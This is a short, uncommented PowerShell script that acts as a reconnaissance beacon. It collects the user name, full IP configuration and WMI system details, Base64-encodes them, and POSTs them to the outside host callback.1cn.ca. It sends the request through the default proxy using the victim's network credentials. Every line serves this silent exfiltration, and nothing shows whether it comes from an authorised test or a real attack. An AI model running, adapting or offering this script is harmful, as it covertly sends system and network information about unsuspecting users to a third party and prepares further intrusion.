
$user = whoami
$ip = ipconfig /all | out-string
$wmi = Get-WmiObject -Class Win32_ComputerSystem | out-string 


$temp  = [System.Text.Encoding]::UTF8.GetBytes($user)
$userEnc = [System.Convert]::ToBase64String($temp)
$temp  = [System.Text.Encoding]::UTF8.GetBytes($ip)
$ipEnc = [System.Convert]::ToBase64String($temp)
$temp  = [System.Text.Encoding]::UTF8.GetBytes($wmi)
$wmiEnc = [System.Convert]::ToBase64String($temp)

$url = "https://callback.1cn.ca/information.html"

$NVC = New-Object System.Collections.Specialized.NameValueCollection
$NVC.Add("U", $userEnc)
$NVC.Add("I", $ipEnc)
$NVC.Add("W", $wmiEnc)

$wc = New-Object System.Net.WebClient     
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$wc.UploadValues($URL,"post", $NVC)

